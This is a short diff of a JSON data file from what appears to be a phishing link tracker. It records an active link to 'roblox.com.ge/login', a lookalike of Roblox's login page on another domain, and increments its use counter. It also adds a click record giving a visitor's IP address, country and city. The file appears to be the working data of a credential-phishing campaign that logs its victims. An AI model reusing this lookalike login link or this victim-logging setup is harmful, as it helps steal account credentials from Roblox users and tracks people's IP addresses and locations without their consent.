@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1264,
+    "useCount": 1265,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10256,6 +10256,14 @@
         "city": "Bandung",
         "flag": "🇮🇩",
         "countryCode": "ID"
+      },
+      {
+        "timestamp": 1777362398194,
+        "ip": "119.94.67.140",
+        "country": "Philippines",
+        "city": "Dinalupihan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
